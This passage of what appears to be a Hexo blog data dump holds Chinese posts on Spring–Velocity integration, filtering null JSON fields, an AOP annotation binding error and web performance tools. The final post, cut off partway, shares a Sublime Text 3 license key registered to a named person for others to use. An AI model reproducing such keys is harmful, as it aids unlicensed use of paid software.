class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Content-Type\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"text/html; charset=UTF-8\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>$!title<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>标题：$!title<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容：$!content<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>macro函数测试：#test()<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"四、模板渲染\"><a href=\"#四、模板渲染\" class=\"headerlink\" title=\"四、模板渲染\"></a>四、模板渲染</h2><p>使用VelocityEngineUtils能很方便的merge template。<br>需要准备一个Map，用于传递变量到VLT中。</p>\n<p><strong>代码样例</strong>：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">Map&lt;String, Object&gt; model = Maps.newHashMap();</div><div class=\"line\">model.put(<span class=\"string\">\"title\"</span>, <span class=\"string\">\"Velocity Template\"</span>);</div><div class=\"line\">model.put(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Content in Velocity Template\"</span>);</div><div class=\"line\"></div><div class=\"line\">String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, <span class=\"string\">\"test.vm\"</span>, Constants.ENCODING, model);</div></pre></td></tr></table></figure></p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://wiki.apache.org/velocity/VelocityAndSpringStepByStep\" target=\"_blank\" rel=\"external\">VelocityAndSpringStepByStep</a></li>\n<li><a href=\"http://mj4d.iteye.com/blog/1524050\" target=\"_blank\" rel=\"external\">velocity.properties配置说明</a></li>\n<li><a href=\"http://blog.csdn.net/glarystar/article/details/6636574\" target=\"_blank\" rel=\"external\">springmvc 3.1整合velocity</a></li>\n<li><a href=\"http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders\" target=\"_blank\" rel=\"external\">configuring_resource_loaders</a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<p>此段内容说明如何整合spring与velocity。<br>此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。</p>\n<h2 id=\"一、配置spring-mvc\"><a href=\"#一、配置spring-mvc\" class=\"headerlink\" title=\"一、配置spring mvc\"></a>一、配置spring mvc</h2><p>首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.</p>\n<h2 id=\"velocity-engine实例化\"><a href=\"#velocity-engine实例化\" class=\"headerlink\" title=\"velocity engine实例化\"></a>velocity engine实例化</h2><p>对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。</p>\n<p>具体配置片段如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"velocityEngine\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.ui.velocity.VelocityEngineFactoryBean\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"resourceLoaderPath\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/vm/\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"configLocation\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"classpath:velocity.properties\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。<br><strong>注</strong>：vm模板也可以放置到src/main/resources目录下。</p>","more":"<h2 id=\"二、velocity配置\"><a href=\"#二、velocity配置\" class=\"headerlink\" title=\"二、velocity配置\"></a>二、velocity配置</h2><p>velocity.properties配置会覆盖默认配置。<br>默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。</p>\n<p>更详细参数配置可参考：configuring_resource_loaders</p>\n<p>根据需要我们自定义的配置文件内容，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"># encoding</div><div class=\"line\">input.encoding=UTF-8</div><div class=\"line\">output.encoding=UTF-8</div><div class=\"line\">contentType=text/html;charset=UTF-8</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"># autoreload when vm changed</div><div class=\"line\">file.resource.loader.cache=false</div><div class=\"line\">file.resource.loader.modificationCheckInterval=1</div><div class=\"line\">velocimacro.library.autoreload=true</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"># macro config</div><div class=\"line\"># 默认情况，velocimacro.library相对于resourceLoaderPath目录</div><div class=\"line\">velocimacro.library=macro.vm</div><div class=\"line\">#velocimacro.permissions.allow.inline=true</div><div class=\"line\">#velocimacro.permissions.allow.inline.to.replace.global=false</div><div class=\"line\">#velocimacro.permissions.allow.inline.local.scope=false</div><div class=\"line\"></div><div class=\"line\">#layout</div><div class=\"line\">#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/</div><div class=\"line\">#tools.view.servlet.error.template=/WEB-INF/vm/error.vm</div><div class=\"line\">#tools.view.servlet.layout.default.template=default.vm</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"># runtime log</div><div class=\"line\">runtime.log=velocity.log</div><div class=\"line\">runtime.log.logsystem.class=org.springframework.ui.velocity.CommonsLoggingLogSystem</div><div class=\"line\">runtime.log.error.stacktrace=true</div><div class=\"line\">runtime.log.warn.stacktrace=true</div><div class=\"line\">runtime.log.info.stacktrace=false</div><div class=\"line\">runtime.log.invalid.reference=true</div></pre></td></tr></table></figure></p>\n<h2 id=\"三、简单模板\"><a href=\"#三、简单模板\" class=\"headerlink\" title=\"三、简单模板\"></a>三、简单模板</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Content-Type\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"text/html; charset=UTF-8\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>$!title<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>标题：$!title<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容：$!content<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>macro函数测试：#test()<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"四、模板渲染\"><a href=\"#四、模板渲染\" class=\"headerlink\" title=\"四、模板渲染\"></a>四、模板渲染</h2><p>使用VelocityEngineUtils能很方便的merge template。<br>需要准备一个Map，用于传递变量到VLT中。</p>\n<p><strong>代码样例</strong>：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">Map&lt;String, Object&gt; model = Maps.newHashMap();</div><div class=\"line\">model.put(<span class=\"string\">\"title\"</span>, <span class=\"string\">\"Velocity Template\"</span>);</div><div class=\"line\">model.put(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Content in Velocity Template\"</span>);</div><div class=\"line\"></div><div class=\"line\">String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, <span class=\"string\">\"test.vm\"</span>, Constants.ENCODING, model);</div></pre></td></tr></table></figure></p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://wiki.apache.org/velocity/VelocityAndSpringStepByStep\">VelocityAndSpringStepByStep</a></li>\n<li><a href=\"http://mj4d.iteye.com/blog/1524050\">velocity.properties配置说明</a></li>\n<li><a href=\"http://blog.csdn.net/glarystar/article/details/6636574\">springmvc 3.1整合velocity</a></li>\n<li><a href=\"http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders\">configuring_resource_loaders</a></li>\n</ol>"},{"title":"spring过滤值为null的JSON字段","date":"2016-02-28T08:57:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 问题说明\n使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。\n因此，需要过滤掉这类字段。\n\n\n## 解决方案\nspring json序列化时，通过`com.fasterxml.jackson.annotation.JsonInclude.Include`指定是否返回值为null的字段。\n\n如下配置所示：\n``` xml\n<mvc:annotation-driven>\n    <mvc:message-converters register-defaults=\"true\">\n        <bean class=\"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter\">\n            <property name=\"objectMapper\">\n                <bean class=\"com.fasterxml.jackson.databind.ObjectMapper\">\n                    <property name=\"serializationInclusion\">\n                        <value type=\"com.fasterxml.jackson.annotation.JsonInclude.Include\">NON_NULL</value>\n                    </property>\n                </bean>\n            </property>\n        </bean>\n    </mvc:message-converters>\n</mvc:annotation-driven>\n```\n\n## 参考文档\nhttp://segmentfault.com/q/1010000002522525","source":"_posts/article/spring/spring过滤值为null的JSON字段.md","raw":"title: \"spring过滤值为null的JSON字段\"\ntags:\n  - issue\n  - java\n  - spring\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:57:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 问题说明\n使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。\n因此，需要过滤掉这类字段。\n\n\n## 解决方案\nspring json序列化时，通过`com.fasterxml.jackson.annotation.JsonInclude.Include`指定是否返回值为null的字段。\n\n如下配置所示：\n``` xml\n<mvc:annotation-driven>\n    <mvc:message-converters register-defaults=\"true\">\n        <bean class=\"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter\">\n            <property name=\"objectMapper\">\n                <bean class=\"com.fasterxml.jackson.databind.ObjectMapper\">\n                    <property name=\"serializationInclusion\">\n                        <value type=\"com.fasterxml.jackson.annotation.JsonInclude.Include\">NON_NULL</value>\n                    </property>\n                </bean>\n            </property>\n        </bean>\n    </mvc:message-converters>\n</mvc:annotation-driven>\n```\n\n## 参考文档\nhttp://segmentfault.com/q/1010000002522525","slug":"article/spring/spring过滤值为null的JSON字段","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxud00685nbtrtj4b0c1","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"问题说明\"><a href=\"#问题说明\" class=\"headerlink\" title=\"问题说明\"></a>问题说明</h2><p>使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。<br>因此，需要过滤掉这类字段。</p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><p>spring json序列化时，通过<code>com.fasterxml.jackson.annotation.JsonInclude.Include</code>指定是否返回值为null的字段。</p>\n<p>如下配置所示：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mvc:annotation-driven</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mvc:message-converters</span> <span class=\"attr\">register-defaults</span>=<span class=\"string\">\"true\"</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter\"</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"objectMapper\"</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.fasterxml.jackson.databind.ObjectMapper\"</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"serializationInclusion\"</span>&gt;</span></div><div class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">value</span> <span class=\"attr\">type</span>=<span class=\"string\">\"com.fasterxml.jackson.annotation.JsonInclude.Include\"</span>&gt;</span>NON_NULL<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mvc:message-converters</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mvc:annotation-driven</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://segmentfault.com/q/1010000002522525\" target=\"_blank\" rel=\"external\">http://segmentfault.com/q/1010000002522525</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"问题说明\"><a href=\"#问题说明\" class=\"headerlink\" title=\"问题说明\"></a>问题说明</h2><p>使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。<br>因此，需要过滤掉这类字段。</p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><p>spring json序列化时，通过<code>com.fasterxml.jackson.annotation.JsonInclude.Include</code>指定是否返回值为null的字段。</p>\n<p>如下配置所示：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mvc:annotation-driven</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mvc:message-converters</span> <span class=\"attr\">register-defaults</span>=<span class=\"string\">\"true\"</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter\"</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"objectMapper\"</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.fasterxml.jackson.databind.ObjectMapper\"</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"serializationInclusion\"</span>&gt;</span></div><div class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">value</span> <span class=\"attr\">type</span>=<span class=\"string\">\"com.fasterxml.jackson.annotation.JsonInclude.Include\"</span>&gt;</span>NON_NULL<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mvc:message-converters</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mvc:annotation-driven</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://segmentfault.com/q/1010000002522525\">http://segmentfault.com/q/1010000002522525</a></p>\n"},{"title":"注解切面缺少注解参数","date":"2016-02-28T05:54:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n针对注解Retry进行切面处理，报**error at --0 formal unbound in pointcut**异常。\n\n因为传递给aroundAdvice切面方法缺少注解参数。\n例如：\n``` java\n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```\n\n**正确样例**：\n``` java\n  @Around(value = \"point() && @annotation(retry)\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```","source":"_posts/article/spring/注解切面缺少注解参数.md","raw":"title: 注解切面缺少注解参数\ntags:\n  - aop\n  - spring\n  - issue\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 13:54:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n针对注解Retry进行切面处理，报**error at --0 formal unbound in pointcut**异常。\n\n因为传递给aroundAdvice切面方法缺少注解参数。\n例如：\n``` java\n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```\n\n**正确样例**：\n``` java\n  @Around(value = \"point() && @annotation(retry)\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```","slug":"article/spring/注解切面缺少注解参数","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxuf006b5nbt9gm8o34d","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<p>针对注解Retry进行切面处理，报<strong>error at –0 formal unbound in pointcut</strong>异常。</p>\n<p>因为传递给aroundAdvice切面方法缺少注解参数。<br>例如：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">@Around</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">aroundAdvice</span><span class=\"params\">(ProceedingJoinPoint joinPoint, Retry retry)</span> <span class=\"keyword\">throws</span> Throwable</span></div></pre></td></tr></table></figure></p>\n<p><strong>正确样例</strong>：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">@Around</span>(value = <span class=\"string\">\"point() &amp;&amp; @annotation(retry)\"</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">aroundAdvice</span><span class=\"params\">(ProceedingJoinPoint joinPoint, Retry retry)</span> <span class=\"keyword\">throws</span> Throwable</span></div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<p>针对注解Retry进行切面处理，报<strong>error at –0 formal unbound in pointcut</strong>异常。</p>\n<p>因为传递给aroundAdvice切面方法缺少注解参数。<br>例如：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">@Around</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">aroundAdvice</span><span class=\"params\">(ProceedingJoinPoint joinPoint, Retry retry)</span> <span class=\"keyword\">throws</span> Throwable</span></div></pre></td></tr></table></figure></p>\n<p><strong>正确样例</strong>：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">@Around</span>(value = <span class=\"string\">\"point() &amp;&amp; @annotation(retry)\"</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">aroundAdvice</span><span class=\"params\">(ProceedingJoinPoint joinPoint, Retry retry)</span> <span class=\"keyword\">throws</span> Throwable</span></div></pre></td></tr></table></figure></p>\n"},{"title":"在线网站性能测试工具","date":"2015-12-29T05:58:00.000Z","_content":"\n\n## 推荐工具\n[GT Matrix](http://gtmetrix.com/)\n[Show Slow](http://www.oschina.net/p/show-slow)\n[Google PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)\n\n\n## 参考文档\n[推荐10个免费在线测试网页性能工具](http://www.daqianduan.com/3962.html)\n[12 个最好的免费网站速度和性能测试工具](http://segmentfault.com/a/1190000000447171)\n[12 个免费在线的 Web 网站性能测试工具](http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing)\n\n","source":"_posts/article/tool/在线网站性能测试工具.md","raw":"title: 在线网站性能测试工具\ntags:\n  - 性能测试\ncategories:\n  - 工具软件\ndate: 2015-12-29 13:58:00\n---\n\n\n## 推荐工具\n[GT Matrix](http://gtmetrix.com/)\n[Show Slow](http://www.oschina.net/p/show-slow)\n[Google PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)\n\n\n## 参考文档\n[推荐10个免费在线测试网页性能工具](http://www.daqianduan.com/3962.html)\n[12 个最好的免费网站速度和性能测试工具](http://segmentfault.com/a/1190000000447171)\n[12 个免费在线的 Web 网站性能测试工具](http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing)\n\n","slug":"article/tool/在线网站性能测试工具","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxui006e5nbtku9cop11","content":"<h2 id=\"推荐工具\"><a href=\"#推荐工具\" class=\"headerlink\" title=\"推荐工具\"></a>推荐工具</h2><p><a href=\"http://gtmetrix.com/\" target=\"_blank\" rel=\"external\">GT Matrix</a><br><a href=\"http://www.oschina.net/p/show-slow\" target=\"_blank\" rel=\"external\">Show Slow</a><br><a href=\"https://developers.google.com/speed/pagespeed/insights/\" target=\"_blank\" rel=\"external\">Google PageSpeed Insights</a></p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://www.daqianduan.com/3962.html\" target=\"_blank\" rel=\"external\">推荐10个免费在线测试网页性能工具</a><br><a href=\"http://segmentfault.com/a/1190000000447171\" target=\"_blank\" rel=\"external\">12 个最好的免费网站速度和性能测试工具</a><br><a href=\"http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing\" target=\"_blank\" rel=\"external\">12 个免费在线的 Web 网站性能测试工具</a></p>\n","excerpt":"","more":"<h2 id=\"推荐工具\"><a href=\"#推荐工具\" class=\"headerlink\" title=\"推荐工具\"></a>推荐工具</h2><p><a href=\"http://gtmetrix.com/\">GT Matrix</a><br><a href=\"http://www.oschina.net/p/show-slow\">Show Slow</a><br><a href=\"https://developers.google.com/speed/pagespeed/insights/\">Google PageSpeed Insights</a></p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://www.daqianduan.com/3962.html\">推荐10个免费在线测试网页性能工具</a><br><a href=\"http://segmentfault.com/a/1190000000447171\">12 个最好的免费网站速度和性能测试工具</a><br><a href=\"http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing\">12 个免费在线的 Web 网站性能测试工具</a></p>\n"},{"title":"Sublime Text 3序列号","date":"2016-04-11T13:29:00.000Z","_content":"\n分享Sublime Text 3序列号一枚：\n``` txt\n—– BEGIN LICENSE —–\nAndrew Weber\nSingle User License\nEA7E-855605\n813A03DD 5E4AD9E6 6C0EEB94 BC99798F\n942194A6 02396E98 E62C9979 4BB979FE\n91424C9D A45400BF F6747D88 2FB88078\n90F5CC94 1CDC92DC 8457107A F151657B\n1D22E383 A997F016 42397640 33F41CFC\nE1D0AE85 A0BBD039 0E9C8D55 E1B89D5D\n5CDB7036 E56DE1C0 EFCC0840 650CD3A6\nB98FC99C 8FAC73EE D2B95564 DF450523\n—— END LICENSE ——\n```","source":"_posts/article/tool/Sublime Text 3序列号.md","raw":"title: Sublime Text 3序列号\ntags:\n  - sublime\n  - 序列号\ncategories:\n  - 工具软件\ndate: 2016-04-11 21:29:00\n---\n\n分享Sublime Text 3序列号一枚：\n``` txt\n—– BEGIN LICENSE —–\nAndrew Weber\nSingle User License\nEA7E-855605\n813A03DD 5E4AD9E6 6C0EEB94 BC99798F\n942194A6 02396E98 E62C9979 4BB979FE\n91424C9D A45400BF F6747D88 